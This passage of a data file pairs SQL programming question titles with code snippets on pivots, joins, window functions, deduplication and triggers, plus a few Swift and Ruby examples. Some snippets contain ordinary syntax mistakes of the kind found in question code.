       sum(case when ""Leave class"" = 'Emergency' then 1 else 0 end) as ""emergency leave"",
       sum(case when ""Leave class"" = 'Sick' then 1 else 0 end) as ""Sick leave"",
       count(*) as ""Total""
FROM leave
group by Payroll
order by count(*) desc;
"
16902,56318,Sql Data Manipulation,"SELECT page_url, 
   MAX(CASE WHEN day = '2012-06-25' THEN verified END) as '2012-06-25',
   MAX(CASE WHEN day = '2012-06-24' THEN verified END) as '2012-06-24'
FROM tableName
GROUP BY page_url
"
17685,19914,SQL Server query results as INSERT,"UPDATE table
SET username = SubString(lastName, 1, 3) + SubString(firstName, 1, 2);
"
23017,58779,psql move data to another table leaving refference to new row,"with i as (
    insert into order_shipments (order_id, method_id, deliver_at, barcode, sent_at, city_id, subway_id)
    select o.id, o.shipment_method_id, o.courier_deliver_at, o.barcode, o.sent_at, o.courier_city_id, o.courier_subway_id
    from orders o
    returning id
)
update orders o
set current_shipment_id = i.id
from i;
"
6362,26688,Postgresql LEFT JOIN with CASE condition,"SELECT hybrid_location.*,
       concentration
FROM   hybrid_location
LEFT JOIN (
  SELECT 1 AS month_num, jan_conc AS concentration, io_postcode_ratios.the_geom
  FROM io_postcode_ratios
  UNION ALL
  SELECT 2 AS month_num, feb_conc AS concentration, io_postcode_ratios.the_geom
  FROM io_postcode_ratios
  UNION ALL
  SELECT 3 AS month_num, march_conc AS concentration, io_postcode_ratios.the_geom
  FROM io_postcode_ratios
) AS io_postcode_ratios ON
    EXTRACT(month FROM hybrid_location.point_time) = io_postcode_ratios.month_num
    AND ST_Within(hybrid_location.the_geom, io_postcode_ratios.the_geom)
"
25430,73864,"mysql update. count, rows where column is null and a columns is the same","UPDATE database.TableName AS A 
SET refCount = 
(SELECT Count(*) FROM database.TableName AS B WHERE A.file1 = B.file1 AND A.file2 is null)
where A.file1 = B.file1 
"
31977,63706,Delete rows with identical ColumnName value in a SQL Table?,"SELECT MIN(ID) AS ID INTO #tmpTable FROM MyDataTable GROUP BY ColumnName
DELETE FROM MyDataTable WHERE ID NOT IN (SELECT ID FROM #tmpTable)
"
1720,64046,SQL query ordering by alternating group ID,"SELECT a.*, COUNT(*) rank
  FROM 
     ( SELECT s.*,g.* 
         FROM songs s 
         JOIN song_genre sg 
           ON sg.songid = s.songid 
         JOIN genres g 
           ON g.genreid = sg.genreid
     ) a
  JOIN
     ( SELECT s.*,g.* 
         FROM songs s 
         JOIN song_genre sg 
           ON sg.songid = s.songid 
         JOIN genres g 
           ON g.genreid = sg.genreid
     ) b
    ON b.genre = a.genre
   AND b.songid <= a.songid
 GROUP
    BY songid
 ORDER 
    BY rank,genre;
"
36378,14420,Pivoting for two tables using sql server,"-----------
--created some data to test
-----------
DECLARE @Topic TABLE (topic CHAR(1))

INSERT INTO @Topic SELECT 'A'
INSERT INTO @Topic SELECT 'B'
INSERT INTO @Topic SELECT 'C'
INSERT INTO @Topic SELECT 'D'

DECLARE @Solution TABLE (solution CHAR(2))

INSERT INTO @Solution SELECT 'AA'
INSERT INTO @Solution SELECT 'BB'
INSERT INTO @Solution SELECT 'CC'
INSERT INTO @Solution SELECT 'DD'
INSERT INTO @Solution SELECT 'EE'
INSERT INTO @Solution SELECT 'FF'
INSERT INTO @Solution SELECT 'GG'
INSERT INTO @Solution SELECT 'HH'
INSERT INTO @Solution SELECT 'II'
INSERT INTO @Solution SELECT 'JJ'
INSERT INTO @Solution SELECT 'KK'
INSERT INTO @Solution SELECT 'LL'
INSERT INTO @Solution SELECT 'MM'
INSERT INTO @Solution SELECT 'NN'
INSERT INTO @Solution SELECT 'OO'
INSERT INTO @Solution SELECT 'PP'


--DROP TABLE #topicCTE

-----------
--created table which shows what IDs from solution table must get topic
-----------
;WITH topicCTE As (
    SELECT topic, ROW_NUMBER() OVER (ORDER BY topic) AS ID
    FROM @Topic
)
SELECT topic, ID
    , CASE WHEN ID % 2 = 1 THEN (((ID / 2)+1) *4 + (ID / 2) *3)-4 ELSE (((ID / 2)) *4 + (ID / 2) *3)-3 END AS RowsMINID
    , CASE WHEN ID % 2 = 1 THEN (((ID / 2)+1) *4 + (ID / 2) *3) ELSE (((ID / 2)) *4 + (ID / 2) *3) END AS RowsMAXID
INTO #topicCTE
FROM topicCTE

/*Example Result
topic   ID  RowsMINID   RowsMAXID
A       1   0           4
B       2   4           7
C       3   7           11
D       4   11          14
*/

--DROP TABLE #FinalData
-----------
--attached topics to solution
-----------  

;WITH SolutionCTE AS (
SELECT Solution, ROW_NUMBER() OVER (ORDER BY Solution) AS ID
FROM @Solution 
)
SELECT S.Solution, T2.Topic, ROW_NUMBER() OVER (PARTITION BY T2.Topic ORDER BY Solution) AS RowsID
INTO #FinalData
FROM SolutionCTE AS S
CROSS APPLY (
            SELECT * 
            FROM #topicCTE AS T
            WHERE T.RowsMINID < S.ID AND T.RowsMAXID >= S.ID
           ) AS T2

/*Example result
Solution    Topic   RowsID
AA          A       1
BB          A       2
CC          A       3
DD          A       4
EE          B       1
FF          B       2
GG          B       3
*/



-----------
--get columns for pivot from @topic table
-----------
DECLARE @columns VARCHAR(1000) = STUFF((SELECT ',[' + topic + ']' FROM @Topic FOR XML PATH('')), 1, 1, '')

-----------
--create pivot sql command
-----------
DECLARE @sql NVARCHAR(MAX) = N'
SELECT ' + @columns + '
FROM #FinalData
PIVOT
(
    MAX(Solution)
    FOR [Topic] IN (' + @columns + ')
) AS p';

EXECUTE sp_executesql @sql

/*FINAL Results
A   B   C   D
AA  EE  HH  LL
BB  FF  II  MM
CC  GG  JJ  NN
DD      KK  

*/
"
23735,43834,Substring inside string,"SELECT * FROM test t1
WHERE EXISTS
(
  SELECT * FROM test t2
  WHERE t1.id<>t2.id AND
  regexp_like(t1.string, '['|| replace(t2.string, '.[]', '\.\[\]')||']')
)
"
39814,3139,count multiple columns with group by in one query,"SELECT 
     SUM(CASE WHEN column1 IS NOT NULL THEN 1 ELSE 0 END) AS column1_count
    ,SUM(CASE WHEN column2 IS NOT NULL THEN 1 ELSE 0 END) AS column2_count
    ,SUM(CASE WHEN column3 IS NOT NULL THEN 1 ELSE 0 END) AS column3_count
FROM table
"
21121,46121,SQL data constraints doubts,"CREATE TABLE `test1` (
`id` int(11) unsigned NOT NULL AUTO_INCREMENT,
`nullable` int(11) DEFAULT NULL,
 PRIMARY KEY (`id`),
 UNIQUE KEY `nullable` (`nullable`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

 INTO `test1` (`id`, `nullable`)
 VALUES
  (1, NULL),
(2, NULL),
(3, NULL);
"
5458,21121,How to change the datatype of the Dummy Column in a View?,"create or replace view ABC_VIEW
(VEHICLEID,BRAND,MODEL,VEHICLE_TYPE,FUEL_TYPE,TRANSMISSION_TYPE,GEARBOX,DRIVE_TYPE,VEHICLE_NUMBER,PRICE,**""TEST Column""**) 
as select  VEHICLEID,BRAND,MODEL,VEHICLE_TYPE,FUEL_TYPE,
TRANSMISSION_TYPE,GEARBOX, DRIVE_TYPE,VEHICLE_NUMBER,PRICE,TO_NUMBER('') 
 from ABC;
"
13150,40888,"SQL : Comparing email-addresses in row, and retrieve not found rows","SELECT * FROM table_name WHERE email_address NOT IN ('email1', 'email2', 'email3')
"
29053,19385,"Add Column to Query From Same Table, Update Values in Duplicated Column?","Select ProductID, tblProduct.ProductType, Price, ((Price *.20)+Price) AS 'Increased Price'
From tblProduct join tblCompany
    On tblProduct.CompanyID = tblCompany.CompanyID
Where tblCompany.CompanyID IN
    (Select CompanyID
    From tblCompany
    Where City = 'Kalamazoo')
Order By ProductID
"
7675,48621,Compare two column dates return if they are within 6 months,"select distinct m.number --as FirstAccount, m2.number as SecondAccount
from jm_people p
inner join master m on p.accountid = m.number
inner join JM_Subpoena s on m.number = s.number
inner join jm_people p2 on p.pid = p2.pid
inner join master m2 on p2.accountid = m2.number
inner join JM_Subpoena s2 on m2.number = s2.number
and m.number != m2.number
WHERE DATEDIFF( mm, s2.dateRequested, s.dateRequested) < 6 OR
DATEDIFF( mm, s2.dateRequested, s.dateRequested) = 6 
AND DATEPART( dd, s2.dateRequested) <= DATEPART( dd, s.dateRequested) 
"
1823,68675,Get max of two entries query,"select machinename, StatusCode, max(size) as size
from machine where MachineID In( '33','22') and StatusCode = 166 
group by machinename, StatusCode
order by max(size) DESC
"
21801,14267,How can i compose two columns to apply a filter?,"SELECT *
  FROM people
 WHERE (first_name || ' ' || last_name) ILIKE 'bat man'
"
32054,27237,Finding reference table from foreign key in SQL Developer,"select acc.table_name REFERENCING_TABLE_NAME, acc.column_name REFERENCING_COLUMN_NAME
from all_constraints ac1,
all_constraints ac2,
all_cons_columns acc
where ac1.constraint_type = 'P'
and ac1.table_name = :table_name
and ac2.r_constraint_name = ac1.constraint_name
and ac2.constraint_name = acc.constraint_name;
"
23963,29602,How to add a value from one table to a particular row in another table?,"UPDATE Person SET City=(SELECT City FROM Country WHERE Country_id = 2) 
WHERE Person_Name = 'Peter'
"
2948,9318,Converting varchar to decimal in sql server 2008,"declare @data as varchar(8)
set @data = '00072330'
print cast(@data as decimal) / 100
"
6256,38584,Composite foreign key in SQL Server,"create table Publisher
(
    PublisherId int not null primary key clustered,
    PublisherName varchar(100) not null,
    IsInternal bit not null
)
go
"
23616,26390,How to spool cells to different files?,"set lines 200
set trimspool on
set head off pages 0
-- may need more set stuff to ensure output is clean
spool run_query.sql
select distinct 'spool ' || name || '.txt' || chr(10) ||
                'select content_to_spol from mytable where name = ''' || name || ''';' || chr(10) ||
                'spool off' cmd
from mytable;
spool off
@run_query.sql
"
20516,19264,adding and incrementing date and time (Postgresql),"update clip c
set
    starts = s.starts,
    ends = s.ends
from (
    select
        starts,
        starts + clip_length as ends,
        file_id,
        position
    from (
        select
            '2013-08-30 22:00:00'::timestamp
            + sum(clip_length) over(order by position)
            - clip_length as starts,
            clip_length,
            file_id,
            position
        from clip
    ) s
) s
where c.file_id = s.file_id
"
24834,41855,Getting Column Name,"CREATE TABLE TableName (Sr INT, ID VARCHAR(10), FName VARCHAR(50),
LName VARCHAR(50), Mark VARCHAR(50));

CREATE TABLE HistoryTable (ID VARCHAR(10), ColumnName VARCHAR(50),
PrevValue VARCHAR(50), NewValue VARCHAR(50));



INSERT INTO TableName VALUES
(1, 'P1', 'amar', 'ranjan' , 100),
(2, 'P2', 'sameer', 'kumar', 200),
(3, 'P1', 'amar', 'ranjan', 200);



CREATE TRIGGER TableNameTrigger
ON TableName
AFTER UPDATE
AS 


SELECT * INTO #Deleted  FROM Deleted 
SELECT * INTO #Inserted FROM Inserted  

DECLARE @ColName varchar(64)
DECLARE columnCursor CURSOR FOR
SELECT COLUMN_NAME
FROM INFORMATION_SCHEMA.COLUMNS
WHERE TABLE_NAME = 'TableName' AND TABLE_SCHEMA='dbo'

OPEN columnCursor

FETCH NEXT FROM columnCursor INTO @ColName

WHILE (@@FETCH_STATUS <> -1)
BEGIN


EXEC(N'INSERT INTO HistoryTable 
     SELECT Deleted.Sr, ''' + @ColName + ''', Deleted.'+ @ColName + ',' + 'Inserted.' + @ColName +' 
     FROM #Deleted Deleted
     INNER JOIN #Inserted Inserted ON Inserted.Sr = Deleted.Sr
     WHERE Deleted.'+ @ColName + ' != Inserted.' + @ColName)




FETCH NEXT FROM columnCursor INTO @ColName

END


DROP TABLE #Deleted 
DROP TABLE #Inserted 

CLOSE columnCursor

DEALLOCATE columnCursor

GO
"
20138,19441,SQL join within same table,"  select GUID, KeyInfo, Message from MyTable where GUID 
IN(SELECT GUID from MyTable Where KeyInfo = 'Test-1')
"
28347,18818,"How to join two tables on two columns normally, but if one of columns contain null, then result must contain rows that match another column only?","select Distinct item.* 
from @item as item 
inner join @filter as filter 
    on (item.x = Coalesce(filter.x,item.x) and item.y = Coalesce(filter.y,item.y))
"
13481,48195,Database design for dentist app,"+-------------------+              +--------------------+
| tbl_treatment     |              | tbl_treatment_type |
+===================+              +====================+
|*treatment_id      |              |*treatment_type_id  |
|+treatment_type_id |<-------------| treatment_name     |
|  ......           |              | ......             |
+-------------------+              +--------------------+
         |                                   |
         v                                   v
+--------------------------+       +------------------------+
| tbl_treatment_attributes |       | tbl_treatment_defaults |
+==========================+       +========================+
|*treatment_id             |       |*treatment_type_id      |
| attribute_name           |<------| attribute_name         |
| attribute_value          |       | default_value          |
| ........                 |       | .......                |
+--------------------------+       +------------------------+
"
9766,5499,Insert value from two tables based on the rows source table,"insert into TableC (id, src) 
select ID, 'A' from tableA 
union 
select ID, 'B' from tableB 
"
37371,26413,Priority executing WHERE clause in JOIN keyword,"select * 
from (
  select *
  from tablename1
  where id='10') t1,
  (
  select *
  from tablename2 
  where id = '10'
) t2  
"
21479,58094,Searching date MySql,"SELECT * FROM `a` 
WHERE `date` = '2015-06-01'
AND `hour` BETWEEN '16:30:00' AND '17:30:00'
"
12418,49346,Best strategy for returning large result sets quickly,"DECLARE @startRow INT ; SET @startrow = 50
;WITH cols
AS
(
    SELECT table_name, column_name, 
        ROW_NUMBER() OVER(ORDER BY table_name, column_name) AS seq, 
        ROW_NUMBER() OVER(ORDER BY table_name DESC, column_name desc) AS totrows
    FROM [INFORMATION_SCHEMA].columns
)
SELECT table_name, column_name, totrows + seq -1 as TotRows
FROM cols
WHERE seq BETWEEN @startRow AND @startRow + 49
ORDER BY seq
"
25363,26580,Compare 2 column in a same SQL table,"select t.*,
       (case when exists (select 1 from table t2 where t1.B like concat(t2.A, '%'))
             then 'Yes'
             else 'No'
        end) as C
from table t;
"
24509,48755,Skip or Filter records from a group if any row has null for an id,"with test(courseId, personId, pointsWon, MobileTitle) as (
 select 'a1','alice',       10      ,'bluTest1' from dual union all    
 select 'a1','alice',       null    ,'bluTest9' from dual union all
 select 'a1','batman',      5       ,'bluTest1' from dual union all
 select 'a1','batman',      5       ,'bluTest9' from dual union all
 select 'b2','robocop',     1       ,'test1'    from dual union all
 select 'b2','robocop',     null    ,'test2'    from dual union all
 select 'b2','madHatter',   5       ,'test1'    from dual union all
 select 'b2','madHatter',   2       ,'test2'    from dual union all
 select 'c3','batman',      25      ,'GOTHAM1'  from dual union all
 select 'c3','batman',      25      ,'GOTHAM2'  from dual union all
 select 'c3','superman',    90      ,'GOTHAM1'  from dual union all
 select 'c3','superman',    null    ,'GOTHAM2'  from dual 
)
select courseId, personId, sum(pointsWon)
from test
group by courseId, personId
having count(1) = count(pointsWon)
"
17495,67526,Get SUM of query result WITHIN same query,"YOUR QUERY

UNION ALL
select 'ALL' as Sub_Tracking,
COUNT(Submission__bTracking) as tickets FROM dbo.MASTER30

WHERE mrSUBMITDATE >= (CONVERT (date, CURRENT_TIMESTAMP -1))
AND mrSUBMITDATE < (CONVERT (date, CURRENT_TIMESTAMP))
"
11699,15525,FIlter by COUNT(*) ? - MYSQL,"SELECT name, COUNT(*)
    FROM mytable
    GROUP BY name
    HAVING COUNT(*) > 1
"
31299,59625,SQL Combine multiple rows from one table into one row with multiple columns,"WITH TAB_RN AS
(
  SELECT ID, Date, LOC, ROW_NUMBER() OVER (PARTITION BY ID, Date ORDER BY LOC) AS RN
  FROM YOUR_TABLE
)
SELECT T1.ID, 
       T1.Date AS DATE1, T1.LOC AS LOC1,
       T2.Date AS DATE2, T2.LOC AS LOC2,
       T3.Date AS DATE3, T3.LOC AS LOC3
FROM TAB_RN T1
LEFT JOIN TAB_RN T2 ON T1.ID = T2.ID AND T1.Date = T2.Date AND T2.RN = 2
LEFT JOIN TAB_RN T3 ON T1.ID = T3.ID AND T1.Date = T2.Date AND T3.RN = 3
WHERE T1.RN = 1
"
39398,20988,MySQL: bulk updating in table,"set @a=0;
set @b=0;


UPDATE MY_INVOICE
INNER JOIN
(
    select 
        F.invoice_id,
        I.secuencial as RESERVED_ID, 
        CONCAT_WS(/* format your final invoice ID */) AS FINAL_MY_INVOICE_NUMBER
    FROM
    (
    select if(@a, @a:=@a+1, @a:=1) as current_row, internal_id
    from MY_INVOICE
    where reserved_id is null
    order by internal_id asc
    limit 2000
    ) F
    INNER JOIN
    (
    SELECT if(@b, @b:=@b+1, @b:=1) as current_row, secuencial
    from reserved_ids
    order by secuencial asc
    limit 2000
    ) I USING (CURRENT_ROW)
) TEMP MY_INVOICE.internal_id=TEMP.INTERNAL_ID
SET MY_INVOICE.RESERVED_ID = TEMP.RESERVED_ID, MY_INVOICE.FINAL_MY_INVOICE_NUMBER=TEMP.FINAL_MY_INVOICE_NUMBER
"
544,8252,Transforming shape of a SQL Table using Pivot,"SELECT BatchID, 
   MAX(CASE WHEN EntityChanged = 'ABC' THEN ChangeValue END) 'ABC',
   MAX(CASE WHEN EntityChanged = 'ABCD' THEN ChangeValue END) 'ABCD',
   MAX(CASE WHEN EntityChanged = 'Something' THEN ChangeValue END) 'Something',
   MAX(CASE WHEN EntityChanged = 'SomethingMore' THEN ChangeValue END) 'SomethingMore'
FROM YourTable t 
GROUP BY BatchID
"
18713,5022,"SQL Server query, must not use subquery","SELECT A.a 
FROM A
LEFT JOIN B
    ON A.a = B.a
    AND B.b = 'literal'
WHERE B.a IS NULL 
"
14345,19727,"Exporting SQL table to Excel - column names are not exporting, only the data","For i = 0 to .Fields.Count - 1
  Sheet1.Range(""A12"").Offset(, i) = .Fields(i).Name
Next
"
15211,75120,numbering partitions based on changing dimensions,"select t1.*,
       dense_rank() over (order by customer, type1, type2, grp) as partition
from (select t1.*,
             (row_number() over (partition by customer order by contract) -
              row_number() over (partition by customer, type1, type2 order by contract)
             ) as grp
      from table1 t1
     ) t1;
"
8493,46308,UPPER() and LOWER() not required?,"SELECT * FROM Table WHERE UPPER(part) = 'SOMEPARTNAME' 
"
25404,65578,Join two tables into one without repeating id in SQL,"SELECT car.Field1, car.Field2, cont.FieldA, cont.FieldB
FROM caracteristicas car
JOIN control cont
  ON car.codigo = cont.codigoMaterial
"
13412,62688,MSSQL - Loop through table and use field value in new query,"    select factoryname, productname from factory cross join products
"
39489,60618,How do I limit the results of an SQL query?,"    SELECT id FROM table LIMIT 5
"
18567,51482,Query 2 sum in 1 table,"select id,
       sum(total) as total,
       (select sum(total) from a) as totalall
from a
group by id
"
39112,44148,Turn integer representation of a price to a double representation,"SELECT name, price/100 as price FROM products
"
28020,55229,extract month in sql query,"SELECT DISTINCT TO_CHAR(hiredate, 'Month') Month_name, department_id dept
   FROM employees
WHERE department_id IN (50, 60, 80);
"
2942,50226,Insert on specific column using Select then normal struct on other columns,"INSERT INTO 
product (pname,currency,other,fields) 
(Select 'aNewProduct', currency, other fields... From Tablex where blah)
"
29396,27062,How to concatenate records based on a GROUP BY?,"SELECT   group_concat (textfield SEPARATOR ' ') AS colA, text_group
FROM     my_table
GROUP BY text_group
"
14904,70148,how to pivot multiple records,"select p.floor,p.[1] as room1,p.[2] as room2,p.[3] as room3 from
(
select floor,apt,row_number() over(partition by floor order by apt) as rn from #t) as t

pivot
( 
min(t.apt)
for t.rn in([1],[2],[3]) 
)as p;
"
35233,54952,WordPress DB Query to count number of users registered per day,"select 
count(*) as total_users ,
date(user_registered) as reg_date 
from wp_users 
group by reg_date 
having total_users > 0 
"
18444,20320,"query to get column values based on values of another table i.e,one table values having as field names in another table","select coalesce(pb.chr_aname, col) as chr_aname, h.val
from (select 'INT_BASIC' as col, INT_BASIC as val from hrm_m_allowance union all
      select 'A0001' as col, A0001 as val from hrm_m_allowance union all
      select 'A0002' as col, A0002 as val from hrm_m_allowance union all
      select 'A0003' as col, A0003 as val from hrm_m_allowance union all
      select 'A0004' as col, A0004 as val from hrm_m_allowance union all
      select 'A0005' as col, A0005 as val from hrm_m_allowance
     ) h left join
     pay_m_allowance pb
     on pb.chr_acode = h.col;
"
3064,38149,Converting varchar column values into integer in MySql,"insert into new_table(LogTypeId, . . .)
    select (case logtype
                 when 'EMAIL_SENT' then 1
                 when 'EMAIL_OPEN' then 2
                . . .
            end), . . .
    from logs;
"
27744,9139,Filter out similar data SQL Server 2008,"Select Data,Max(ID) From tablename group by Data
"
2029,51068,Database Location in Scheme,"(define-runtime-path localdb ""localdb.db"")
"
38126,62361,How to avoid distinct,"select
      user_id,
      count(*) as Orders
   from
      orders
   group by
      user_id
"
13789,20758,Fetch a CKReference object from a CKReference,"struct Shop {
  // other variables....
  var record : CKRecord?
  var commentRef : CKReference?
}

struct Comment {
  // other variables....
  var record : CKRecord?
  var clientRef : CKReference?
}

var shops : [Shop]
var comments : [Comment]

func commentsWithReference(ref: CKReference) -> [Comment] {
  let matchingComments = comments.filter {$0.record!.recordID == ref.recordID }
  return matchingComments
}

let shopComments = shops.map { commentsWithReference($0.commentRef!) }
"
11013,2375,How to display multiple rows from a table without using cursor?,"BEGIN
    FOR T IN (SELECT 'data_1' col_1, 
                     'data_2' col_2, 
                     'data_3' col_3
              FROM   dual) LOOP

    dbms_output.put_line('Query returns: '||T.col_1||', '||T.col_2||', '||T.col_3);

    END LOOP;
END;
"
10444,68574,Simplify SQL Query to look in a list,"where Filename in (""abc.exe"",""test.txt"",""def.exe"",..)
"
17342,59131,Is there a database or a data structure for Ruby to implement relation matrices?,"TESTDATA = <<ENDCSV
,red,blue,modern,old fashion,sexy
Jeans myway,0%,100%,30%,30%,70%
Polo Shirt,100%,0%,10%,40%,1%
Bra,100%,0%,100%,0%,100%
ENDCSV

def test
  products = RelationTable.load_from_csv( TESTDATA )

  p products.find( :col, 'old fashion','modern' )
  #=> [[""Jeans myway"", 9.0], [""Polo Shirt"", 4.0]]

  p products.find( :row, 'Polo Shirt' )
  #=> [[""red"", 100.0], [""old fashion"", 40.0], [""modern"", 10.0]]

  p products.find( :col, 'sexy' )
  #=> [[""Bra"", 100.0], [""Jeans myway"", 70.0], [""Polo Shirt"", 1.0]]

  p products.find( :row, 'Polo Shirt','Bra' )
  #=> [[""red"", 100.0], [""modern"", 10.0]]

  p products.find( :col, 'sexy','modern' )
  #=> [[""Bra"", 100.0], [""Jeans myway"", 21.0], [""Polo Shirt"", 0.1]]

  p products.find( :col, 'red', 'blue' )
  #=> []

  p products.find( :col, 'bogus' )
  #=> []
end

class RelationTable
  def self.load_from_csv( csv )
    require 'csv'
    data = CSV.parse(csv)
    self.new( data.shift[1..-1], data.map{ |r| r.shift }, data )
  end
  def initialize( col_names=[], row_names=[], weights=[] )
    @by_col = Hash.new{|h,k|h[k]=Hash.new(0)}
    @by_row = Hash.new{|h,k|h[k]=Hash.new(0)}
    row_names.each_with_index do |row,r|
      col_names.each_with_index do |col,c|
        @by_col[col][row] = @by_row[row][col] = weights[r][c].to_f
      end
    end
    # Multiply all weights, sort by weight (descending), only include non-zero
    merge_by{ |values| values.inject(1.0){ |weight,v| weight*v/100 }*100 }
    sort_by{ |key,value| [-value,key] }
    filter_by{ |key,value| value > 0 }
  end
  def merge_by(&proc);  @merge  = proc; end
  def sort_by(&proc);   @sort   = proc; end
  def filter_by(&proc); @filter = proc; end
  def find( row_or_col, *names )
    axis = (row_or_col == :row) ? @by_row : @by_col
    merge(axis.values_at(*names)).select(&@filter).sort_by(&@sort)
  end
  private
    # Turn an array of hashes into a hash of arrays of values,
    # and then merge the values using the merge_by proc
    def merge( hashes )
      if hashes.length==1
        hashes.first # Speed optimization; ignores the merge_by block
      else
        result = Hash.new{|h,k|h[k]=[]}
        hashes.each{ |h| h.each{ |k,v| result[k] << v } }
        result.each{ |k,values| result[k] = @merge[values] }
        result
       end
    end
end

test if __FILE__==$0
"
1496,63843,SQL - Select distinct on two column,"SELECT Id_Category, Id_Theme,
    (SELECT Id FROM Words W 
      WHERE W.Id_Category = G.Id_Category AND W.Id_Theme = G.Id_Theme
      ORDER BY RAND() LIMIT 1
    ) Id
FROM Words G
GROUP BY Id_Category, Id_Theme
ORDER BY RAND()
LIMIT 3
"
14111,5129,how to combine two different query-results by one column,"SELECT anchor, MAX(valueQ1) AS valueQ1, MAX(valueQ2) AS valueQ2
FROM (
    SELECT
        anchor_date AS anchor,
        SUM( GETVAL(24, entry_id) ) AS valueQ1,
        NULL AS valueQ2
     FROM users
     WHERE blog_id = 173
     GROUP BY DATE(anchor)

     UNION

     SELECT
        anchor AS anchor,
        NULL AS valueQ1,
        SUM(value) AS valueQ2
     FROM infodata
     WHERE infoid IN(330, 1492, 1066)
     AND entity = 173) AS u
GROUP BY anchor
"
32405,4739,Set sort-order field based on alphabetically ordering of another field,";WITH so AS
(
SELECT 
   SortOrder,
   ROW_NUMBER() OVER (ORDER BY InvoiceStatusName) AS rn
FROM   dbo.InvoiceStatus
)
UPDATE so SET SortOrder = rn
"
8115,47905,Why does this SQL code returns true when both operands operated by operator OR are False?,"false OR false => false
false OR true => true
true OR false => true
true OR true => true
"
26609,25476,Possible self join to get id of all matching columns,"SELECT * 
FROM MyTable 
WHERE ID in (SELECT ID
             FROM MyTable
             WHERE (Name = 'Product' AND Value = 'Foobar')
                OR (Name = 'Colour'  AND Value = 'Blue'  )
             GROUP BY ID
             HAVING COUNT(*) = 2)
"
5162,6599,Adding another column with a different condition in SQL,"select  count(distinct project_id) as total
,       count(distinct case 
            when datediff(day, creation_date, getdate()) < 6
            then project_id end) as total_6day
,       count(distinct case 
            when datediff(day, creation_date, getdate()) < 7
            then project_id end) as total_7day
,       count(distinct case 
            when datediff(day, creation_date, getdate()) < 42 
            then project_id end) as total_42day
from    dbo.v_report_project proj
join    dbo.v_report_program prog
on      proj.program_id = prog.program_id
where   project_status = 'Active'
"
7842,14403,Interesting SQL Sorting Issue,"SELECT g1.group_id, g1.name
FROM 
    groups g1
        INNER JOIN
    (
        SELECT  MIN(group_id), name
        FROM groups
        GROUP BY name
    ) g2 on g1.name = g2.name
ORDER BY g2.group_id, g1.name, g1.group_id
"
27086,39783,Sum of marks in one table,"select user_id, sum(mark) sum_of_mark 
from your_table 
group by user_id 
where lesson_id = @lesson 
order by sum_of_mark DESC;
"
37304,18138,Is a detail table with two masters possible?,"Master(MasterID (Primary Key), {Common fields})
X({X specific fields}, MasterID (Foreign Key))
Y({Y specific fields}, MasterID (Foreign Key))
"
14675,18479,How to close existing connections to a DB,"alter database YourDb set single_user with rollback immediate
"
26197,35203,Comma delimeted using sql query,"with temp as
(
    select 'Number' Name , '123-456,654-321,098-765' AS val  from dual
)
select distinct
  t.name, 
  trim(regexp_substr(t.val, '[^,]+', 1, levels.column_value))  as val
from 
  temp t,
  table(cast(multiset(select level from dual connect by  level <= length (
        regexp_replace(t.val, '[^,]+'))  + 1) as sys.OdciNumberList)) levels
order by name;
"
23693,36539,Modifying CDbCriteria to look at my pivot table,"// CDbCriteria $criteria already prepared given other search criteria, then: */
   $criteria->select = 't.classroom_id, t.title, t.organisation_id, case when cu.classroom_id is null then 0 else 1 end as pivot_set';
   $criteria->join = 'left join organisation_classrooms_myusers cu on cu.classroom_id=t.classroom_id and cu.user_id=:uid';
   $criteria->params['uid'] = $uid;  /* e.g. 1558 */
"
32569,34428,SQL query : how to select records which all records in related table have specific value of attribute,"select s.school_id
from school s join
     classroom c
     on s.school_id = c.school_id
group by s.school_id
having sum(case when has_projector = 't' then 1 else 0 end) = count(*);
"
36209,6654,Delete older from a duplicate select,"--PULL YOUR SELECT OF RECS WITH DUPES INTO A TEMP TABLE 
--(OR CREATE A NEW TABLE SO THAT YOU CAN KEEP THEM AROUND FOR LATER IN CASE)
SELECT   NUIP,FECHA_REGISTRO
INTO #NUIP 
FROM     SO_NUIP
WHERE NUIP IN (
SELECT NUIP
 FROM SO_NUIP
 GROUP BY NUIP
 HAVING (COUNT(NUIP) > 1)
)

--CREATE FLAG FOR DETERMINIG DUPES
ALTER TABLE #NUIP ADD DUPLICATETOREMOVE bit

 --USE `RANK()` TO SET FLAG
 UPDATE #NUIP
 SET DUPLICATETOREMOVE = CASE X.RANK
        WHEN  1 THEN 1
        ELSE 0 
        END
--SELECT *
FROM #NUIP A
INNER JOIN (SELECT NUIP,FECHA_REGISTRO,RANK() OVER (PARTITION BY [NUIP] ORDER BY    FECHA_REGISTRO ASC) AS RANK
FROM #NUIP) X ON X.NUIP = A.NUIP AND X.FECHA_REGISTRO = A.FECHA_REGISTRO

--HERE IS YOUR DELETE LIST
SELECT * 
FROM so_registros_civiles_nacimiento R
JOIN #NUIP N ON N.NUIP = R.NUIP AND N.FECHA_REGISTRO = R.FECHA_REGISTRO
WHERE N.DUPLICATETOREMOVE = 1

--HERE IS YOUR KEEP LIST
SELECT * 
FROM so_registros_civiles_nacimiento R
JOIN #NUIP N ON N.NUIP = R.NUIP AND N.FECHA_REGISTRO = R.FECHA_REGISTRO
WHERE N.DUPLICATETOREMOVE = 0

--ZAP THEM AND COMMIT YOUR TRANSACTION, YOU'VE STILL GOT A REC OF THE DELETEDS FOR AS LONG AS THE SCOPE OF YOUR #NUIP
BEGIN TRAN --COMMIT  --ROLLBACK
DELETE FROM so_registros_civiles_nacimiento
JOIN #NUIP N ON N.NUIP = R.NUIP AND N.FECHA_REGISTRO = R.FECHA_REGISTRO
WHERE N.DUPLICATETOREMOVE = 1
"
37897,34059,Select or leave a field blank dependent on a condition without affecting query,"Select
a.Name,
iif (c.[type] = ""fancy_hat"", c.hat, NULL) as FancyHat,
b.Shirt,
b.Shoes,
c.Hat

from
directory a, store b, superHatStore c

where 
a.key = b.key
a.key = c.key
"
39333,25363,number of records in a table in SQL,"SELECT info.ISD, Data.ispnName, Data.diskName, COUNT(*) 
FROM Data, info
WHERE Data.Reconciled = 0 AND
    Data.Filled = 1 AND
    Data.Sub_Needed = 1 AND
    Data.Deleted = 0 AND
    Data.contract_date >= 'START DATE' AND
    Data.contract_date <= 'END DATE'
GROUP BY Data.diskName
"
1922,1290,MySQL Simple row num incremental counter,"SELECT t.*,
       @r:= CASE WHEN @t = t.`user` THEN @r +1 ELSE 1 END rownum,
       @t:= t.`user` user_group
FROM    (
        SELECT CONCAT('    ',g.node1,'    ',g.node2), g.`user`
        FROM sn.sn_graph_reduced g
